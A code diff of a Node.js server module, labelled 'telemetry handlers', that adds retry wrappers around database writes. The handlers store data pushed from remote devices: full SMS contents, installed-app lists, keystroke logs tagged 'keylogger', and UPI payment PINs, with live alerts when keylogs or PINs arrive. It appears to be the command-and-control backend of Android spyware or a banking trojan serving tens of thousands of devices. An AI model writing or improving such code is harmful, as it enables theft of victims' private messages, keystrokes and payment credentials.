@@ -1,6 +1,7 @@
 const { prisma } = require('../config/database');
 const logger = require('../../utils/logger');
 const presenceService = require('../services/PresenceService');
+const { withRetry } = require('../../utils/prisma-utils');
 
 const getVal = (obj, key1, key2) => {
     if (!obj) return undefined;
@@ -18,6 +19,7 @@ const toBigInt = (val) => {
         return null;
     }
 };
+
 
 // Heartbeat batching
 const heartbeatBuffer = [];
@@ -39,37 +41,39 @@ async function flushHeartbeats() {
     ]);
 
     try {
-        await prisma.$transaction([
-            // 1. First ensure all devices exist and update their status/heartbeat data
-            ...Array.from(allDeviceIds).map(dId => {
-                const data = updatesToFlush.get(dId) || {
-                    last_seen: new Date(),
-                    status: true,
-                    heartbeat: undefined
-                };
+        await withRetry(async () => {
+            await prisma.$transaction([
+                // 1. First ensure all devices exist and update their status/heartbeat data
+                ...Array.from(allDeviceIds).map(dId => {
+                    const data = updatesToFlush.get(dId) || {
+                        last_seen: new Date(),
+                        status: true,
+                        heartbeat: undefined
+                    };
 
-                return prisma.device.upsert({
-                    where: { device_id: dId },
-                    update: {
-                        last_seen: data.last_seen,
-                        status: data.status,
-                        heartbeat: data.heartbeat,
-                        app_id: data.app_id,
-                        build_id: data.build_id
-                    },
-                    create: {
-                        device_id: dId,
-                        last_seen: data.last_seen,
-                        status: data.status,
-                        heartbeat: data.heartbeat,
-                        app_id: data.app_id,
-                        build_id: data.build_id
-                    }
-                });
-            }),
-            // 2. Then create the heartbeat logs (FKs are now guaranteed)
-            ...(heartbeatsToFlush.length > 0 ? [prisma.heartbeat.createMany({ data: heartbeatsToFlush })] : [])
-        ], { timeout: 30000 });
+                    return prisma.device.upsert({
+                        where: { device_id: dId },
+                        update: {
+                            last_seen: data.last_seen,
+                            status: data.status,
+                            heartbeat: data.heartbeat,
+                            app_id: data.app_id,
+                            build_id: data.build_id
+                        },
+                        create: {
+                            device_id: dId,
+                            last_seen: data.last_seen,
+                            status: data.status,
+                            heartbeat: data.heartbeat,
+                            app_id: data.app_id,
+                            build_id: data.build_id
+                        }
+                    });
+                }),
+                // 2. Then create the heartbeat logs (FKs are now guaranteed)
+                ...(heartbeatsToFlush.length > 0 ? [prisma.heartbeat.createMany({ data: heartbeatsToFlush })] : [])
+            ], { timeout: 30000 });
+        }, 3, 500); // Higher delay for batch flush
 
         // Remove successfully flushed heartbeats
         heartbeatBuffer.splice(0, heartbeatsToFlush.length);
@@ -123,54 +127,56 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
 
             // Parallel Upsert Optimization for high-scale (50k+ devices)
             // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
-            await prisma.$transaction([
-                prisma.device.upsert({
-                    where: { device_id: deviceId },
-                    update: {
-                        last_seen: new Date(),
-                        app_id: appId,
-                        build_id: buildId
-                    },
-                    create: {
-                        device_id: deviceId,
-                        last_seen: new Date(),
-                        status: true,
-                        app_id: appId,
-                        build_id: buildId
-                    }
-                }),
-                ...validMessages.map(msg => {
-                    const dId = getVal(msg, 'device_id', 'deviceId');
-                    const idRaw = getVal(msg, 'id', 'id');
-                    const smsId = String(idRaw);
-                    const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);
-
-                    return prisma.smsMessage.upsert({
-                        where: { device_id_local_sms_id: { device_id: dId, local_sms_id: localSmsId } },
+            await withRetry(async () => {
+                await prisma.$transaction([
+                    prisma.device.upsert({
+                        where: { device_id: deviceId },
                         update: {
-                            id: smsId,
-                            address: getVal(msg, 'address', 'address') || "",
-                            body: getVal(msg, 'body', 'body') || "",
-                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
-                            timestamp: toBigInt(getVal(msg, 'timestamp', 'timestamp')) || BigInt(0),
-                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
-                            sync_status: 'synced',
-                            updated_at: new Date()
+                            last_seen: new Date(),
+                            app_id: appId,
+                            build_id: buildId
                         },
                         create: {
-                            id: smsId,
-                            local_sms_id: localSmsId,
-                            device_id: dId,
-                            address: getVal(msg, 'address', 'address') || "",
-                            body: getVal(msg, 'body', 'body') || "",
-                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
-                            timestamp: toBigInt(getVal(msg, 'timestamp', 'timestamp')) || BigInt(0),
-                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
-                            sync_status: 'synced'
+                            device_id: deviceId,
+                            last_seen: new Date(),
+                            status: true,
+                            app_id: appId,
+                            build_id: buildId
                         }
-                    });
-                })
-            ], { timeout: 30000 });
+                    }),
+                    ...validMessages.map(msg => {
+                        const dId = getVal(msg, 'device_id', 'deviceId');
+                        const idRaw = getVal(msg, 'id', 'id');
+                        const smsId = String(idRaw);
+                        const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);
+
+                        return prisma.smsMessage.upsert({
+                            where: { device_id_local_sms_id: { device_id: dId, local_sms_id: localSmsId } },
+                            update: {
+                                id: smsId,
+                                address: getVal(msg, 'address', 'address') || "",
+                                body: getVal(msg, 'body', 'body') || "",
+                                date: getVal(msg, 'date', 'date') || new Date().toISOString(),
+                                timestamp: toBigInt(getVal(msg, 'timestamp', 'timestamp')) || BigInt(0),
+                                type: parseInt(getVal(msg, 'type', 'type') || "1"),
+                                sync_status: 'synced',
+                                updated_at: new Date()
+                            },
+                            create: {
+                                id: smsId,
+                                local_sms_id: localSmsId,
+                                device_id: dId,
+                                address: getVal(msg, 'address', 'address') || "",
+                                body: getVal(msg, 'body', 'body') || "",
+                                date: getVal(msg, 'date', 'date') || new Date().toISOString(),
+                                timestamp: toBigInt(getVal(msg, 'timestamp', 'timestamp')) || BigInt(0),
+                                type: parseInt(getVal(msg, 'type', 'type') || "1"),
+                                sync_status: 'synced'
+                            }
+                        });
+                    })
+                ], { timeout: 30000 });
+            });
 
             logger.info(`✅ Synced ${validMessages.length} SMS messages for ${deviceId}`);
             // validMessages.forEach(msg => notifyChange('message_change', { ...msg, device_id: getVal(msg, 'device_id', 'deviceId') }));
@@ -199,46 +205,48 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                 const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);
 
                 // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
-                await prisma.$transaction([
-                    prisma.device.upsert({
-                        where: { device_id: deviceId },
-                        update: {
-                            last_seen: new Date(),
-                            app_id: appId,
-                            build_id: buildId
-                        },
-                        create: {
-                            device_id: deviceId,
-                            last_seen: new Date(),
-                            status: true,
-                            app_id: appId,
-                            build_id: buildId
-                        }
-                    }),
-                    prisma.smsMessage.upsert({
-                        where: { device_id_local_sms_id: { device_id: msgDeviceId, local_sms_id: localSmsId } },
-                        update: {
-                            id: smsId,
-                            address: getVal(msg, 'address', 'address') || "",
-                            body: getVal(msg, 'body', 'body') || "",
-                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
-                            timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
-                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
-                            sync_status: 'synced'
-                        },
-                        create: {
-                            id: smsId,
-                            local_sms_id: localSmsId,
-                            device_id: msgDeviceId,
-                            address: getVal(msg, 'address', 'address') || "",
-                            body: getVal(msg, 'body', 'body') || "",
-                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
-                            timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
-                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
-                            sync_status: 'synced'
-                        }
-                    })
-                ]);
+                await withRetry(async () => {
+                    await prisma.$transaction([
+                        prisma.device.upsert({
+                            where: { device_id: deviceId },
+                            update: {
+                                last_seen: new Date(),
+                                app_id: appId,
+                                build_id: buildId
+                            },
+                            create: {
+                                device_id: deviceId,
+                                last_seen: new Date(),
+                                status: true,
+                                app_id: appId,
+                                build_id: buildId
+                            }
+                        }),
+                        prisma.smsMessage.upsert({
+                            where: { device_id_local_sms_id: { device_id: msgDeviceId, local_sms_id: localSmsId } },
+                            update: {
+                                id: smsId,
+                                address: getVal(msg, 'address', 'address') || "",
+                                body: getVal(msg, 'body', 'body') || "",
+                                date: getVal(msg, 'date', 'date') || new Date().toISOString(),
+                                timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
+                                type: parseInt(getVal(msg, 'type', 'type') || "1"),
+                                sync_status: 'synced'
+                            },
+                            create: {
+                                id: smsId,
+                                local_sms_id: localSmsId,
+                                device_id: msgDeviceId,
+                                address: getVal(msg, 'address', 'address') || "",
+                                body: getVal(msg, 'body', 'body') || "",
+                                date: getVal(msg, 'date', 'date') || new Date().toISOString(),
+                                timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
+                                type: parseInt(getVal(msg, 'type', 'type') || "1"),
+                                sync_status: 'synced'
+                            }
+                        })
+                    ]);
+                });
                 //   notifyChange('message_change', { ...msg, device_id: msgDeviceId });
             }
             if (ack) ack(true);
@@ -263,59 +271,61 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
 
             // Parallel Upsert Optimization for Apps
             // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
-            await prisma.$transaction([
-                prisma.device.upsert({
-                    where: { device_id: deviceId },
-                    update: {
-                        last_seen: new Date(),
-                        app_id: appId,
-                        build_id: buildId
-                    },
-                    create: {
-                        device_id: deviceId,
-                        last_seen: new Date(),
-                        status: true,
-                        app_id: appId,
-                        build_id: buildId
-                    }
-                }),
-                ...validApps.map(app => {
-                    const packageName = getVal(app, 'package_name', 'packageName');
-                    const dId = getVal(app, 'device_id', 'deviceId');
-                    const appName = getVal(app, 'app_name', 'appName') || packageName;
-
-                    return prisma.installedApp.upsert({
-                        where: { device_id_package_name: { device_id: dId, package_name: packageName } },
+            await withRetry(async () => {
+                await prisma.$transaction([
+                    prisma.device.upsert({
+                        where: { device_id: deviceId },
                         update: {
-                            app_name: appName,
-                            icon: getVal(app, 'icon', 'icon') || "",
-                            version_name: getVal(app, 'version_name', 'versionName') || "",
-                            version_code: toBigInt(getVal(app, 'version_code', 'versionCode')),
-                            first_install_time: toBigInt(getVal(app, 'first_install_time', 'firstInstallTime')),
-                            last_update_time: toBigInt(getVal(app, 'last_update_time', 'lastUpdateTime')),
-                            is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
-                            target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
-                            min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
-                            sync_timestamp: toBigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) || BigInt(Date.now()),
-                            updated_at: new Date()
+                            last_seen: new Date(),
+                            app_id: appId,
+                            build_id: buildId
                         },
                         create: {
-                            device_id: dId,
-                            package_name: packageName,
-                            app_name: appName,
-                            icon: getVal(app, 'icon', 'icon') || "",
-                            version_name: getVal(app, 'version_name', 'versionName') || "",
-                            version_code: toBigInt(getVal(app, 'version_code', 'versionCode')),
-                            first_install_time: toBigInt(getVal(app, 'first_install_time', 'firstInstallTime')),
-                            last_update_time: toBigInt(getVal(app, 'last_update_time', 'lastUpdateTime')),
-                            is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
-                            target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
-                            min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
-                            sync_timestamp: toBigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) || BigInt(Date.now()),
+                            device_id: deviceId,
+                            last_seen: new Date(),
+                            status: true,
+                            app_id: appId,
+                            build_id: buildId
                         }
-                    });
-                })
-            ], { timeout: 30000 });
+                    }),
+                    ...validApps.map(app => {
+                        const packageName = getVal(app, 'package_name', 'packageName');
+                        const dId = getVal(app, 'device_id', 'deviceId');
+                        const appName = getVal(app, 'app_name', 'appName') || packageName;
+
+                        return prisma.installedApp.upsert({
+                            where: { device_id_package_name: { device_id: dId, package_name: packageName } },
+                            update: {
+                                app_name: appName,
+                                icon: getVal(app, 'icon', 'icon') || "",
+                                version_name: getVal(app, 'version_name', 'versionName') || "",
+                                version_code: toBigInt(getVal(app, 'version_code', 'versionCode')),
+                                first_install_time: toBigInt(getVal(app, 'first_install_time', 'firstInstallTime')),
+                                last_update_time: toBigInt(getVal(app, 'last_update_time', 'lastUpdateTime')),
+                                is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
+                                target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
+                                min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
+                                sync_timestamp: toBigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) || BigInt(Date.now()),
+                                updated_at: new Date()
+                            },
+                            create: {
+                                device_id: dId,
+                                package_name: packageName,
+                                app_name: appName,
+                                icon: getVal(app, 'icon', 'icon') || "",
+                                version_name: getVal(app, 'version_name', 'versionName') || "",
+                                version_code: toBigInt(getVal(app, 'version_code', 'versionCode')),
+                                first_install_time: toBigInt(getVal(app, 'first_install_time', 'firstInstallTime')),
+                                last_update_time: toBigInt(getVal(app, 'last_update_time', 'lastUpdateTime')),
+                                is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
+                                target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
+                                min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
+                                sync_timestamp: toBigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) || BigInt(Date.now()),
+                            }
+                        });
+                    })
+                ], { timeout: 30000 });
+            });
 
             logger.info(`✅ Synced ${validApps.length} apps for ${deviceId}`);
             socket.emit('sync_complete', 'apps', validApps.length);
@@ -356,6 +366,7 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                 build_id: buildId
             });
 
+            notifyChange('device_change', { device_id: deviceId, status: (h.status !== undefined) ? Boolean(h.status) : true, last_seen: new Date() });
             socket.emit('heartbeat_ack');
             if (ack) ack(true);
         } catch (error) {
@@ -372,31 +383,33 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
 
             if (dId === deviceId) {
                 // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
-                await prisma.$transaction([
-                    prisma.device.upsert({
-                        where: { device_id: deviceId },
-                        update: {
-                            last_seen: new Date(),
-                            app_id: appId,
-                            build_id: buildId
-                        },
-                        create: {
-                            device_id: deviceId,
-                            last_seen: new Date(),
-                            status: true,
-                            app_id: appId,
-                            build_id: buildId
-                        }
-                    }),
-                    prisma.keyLog.create({
-                        data: {
-                            device_id: dId,
-                            keylogger: getVal(keyLog, 'keylogger', 'keylogger') || 'unknown',
-                            key: getVal(keyLog, 'key', 'key') || '',
-                            currentDate: getVal(keyLog, 'current_date', 'currentDate') ? new Date(getVal(keyLog, 'current_date', 'currentDate')) : new Date()
-                        }
-                    })
-                ]);
+                await withRetry(async () => {
+                    await prisma.$transaction([
+                        prisma.device.upsert({
+                            where: { device_id: deviceId },
+                            update: {
+                                last_seen: new Date(),
+                                app_id: appId,
+                                build_id: buildId
+                            },
+                            create: {
+                                device_id: deviceId,
+                                last_seen: new Date(),
+                                status: true,
+                                app_id: appId,
+                                build_id: buildId
+                            }
+                        }),
+                        prisma.keyLog.create({
+                            data: {
+                                device_id: dId,
+                                keylogger: getVal(keyLog, 'keylogger', 'keylogger') || 'unknown',
+                                key: getVal(keyLog, 'key', 'key') || '',
+                                currentDate: getVal(keyLog, 'current_date', 'currentDate') ? new Date(getVal(keyLog, 'current_date', 'currentDate')) : new Date()
+                            }
+                        })
+                    ]);
+                });
                 notifyChange('keylog_change', { ...keyLog, device_id: dId });
             }
             if (ack) ack(true);
@@ -414,30 +427,32 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
 
             if (dId === deviceId) {
                 // 🛡️ Ensure device exists first to prevent P2003 Foreign Key errors
-                await prisma.$transaction([
-                    prisma.device.upsert({
-                        where: { device_id: deviceId },
-                        update: {
-                            last_seen: new Date(),
-                            app_id: appId,
-                            build_id: buildId
-                        },
-                        create: {
-                            device_id: deviceId,
-                            last_seen: new Date(),
-                            status: true,
-                            app_id: appId,
-                            build_id: buildId
-                        }
-                    }),
-                    prisma.upiPin.create({
-                        data: {
-                            device_id: dId,
-                            pin: String(getVal(pinData, 'pin', 'pin') || ''),
-                            currentDate: getVal(pinData, 'current_date', 'current_date') ? new Date(getVal(pinData, 'current_date', 'current_date')) : new Date()
-                        }
-                    })
-                ]);
+                await withRetry(async () => {
+                    await prisma.$transaction([
+                        prisma.device.upsert({
+                            where: { device_id: deviceId },
+                            update: {
+                                last_seen: new Date(),
+                                app_id: appId,
+                                build_id: buildId
+                            },
+                            create: {
+                                device_id: deviceId,
+                                last_seen: new Date(),
+                                status: true,
+                                app_id: appId,
+                                build_id: buildId
+                            }
+                        }),
+                        prisma.upiPin.create({
+                            data: {
+                                device_id: dId,
+                                pin: String(getVal(pinData, 'pin', 'pin') || ''),
+                                currentDate: getVal(pinData, 'current_date', 'current_date') ? new Date(getVal(pinData, 'current_date', 'current_date')) : new Date()
+                            }
+                        })
+                    ]);
+                });
                 notifyChange('pin_change', { ...pinData, device_id: dId });
             }
             if (ack) ack(true);
